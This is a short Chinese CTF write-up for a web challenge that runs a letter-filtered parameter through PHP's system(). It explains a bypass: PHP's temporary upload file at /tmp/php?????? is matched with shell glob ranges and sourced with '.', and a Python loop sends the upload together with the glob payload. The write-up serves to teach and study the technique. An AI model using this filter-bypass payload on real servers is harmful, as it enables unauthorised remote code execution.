tags:: CTFWEB/RCE, CTFWEB/Shell/WAF绕过

- # WP
  
  题目会执行参数c，但是参数c不能包含任何字母
  
  ```php
  if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
  system($c);
  } 
  ```
  
  注意到PHP的一个特性：上传文件时，PHP会将文件暂存在`/tmp`中，文件名为`php??????`(问号为大小写字母)
  
  *nix shell 可以用[glob](https://man7.org/linux/man-pages/man7/glob.7.html)匹配文件
  
  > 其中可以用`[@-[]`代表大写字母，`[_-{]`代表小写字母(ascii在这个区间的字母)
  
  并且，*nix shell还有一个特性：`.`代表当前shell，也就是说`. ./test.sh`相当于用当前的shell执行`test.sh`
  
  使用这三个特性，我么可以向目标发送并执行恶意文件，实现RCE
  
  ```python
  while True:
    r = requests.post(url, 
        params = {
            "c": ". /???/????????[@-[]"
        },
        files={
            "file":("a.txt", "cat flag.php")
        }
    )
    if r.text:
        break
  
  print(r.text)
  ```
-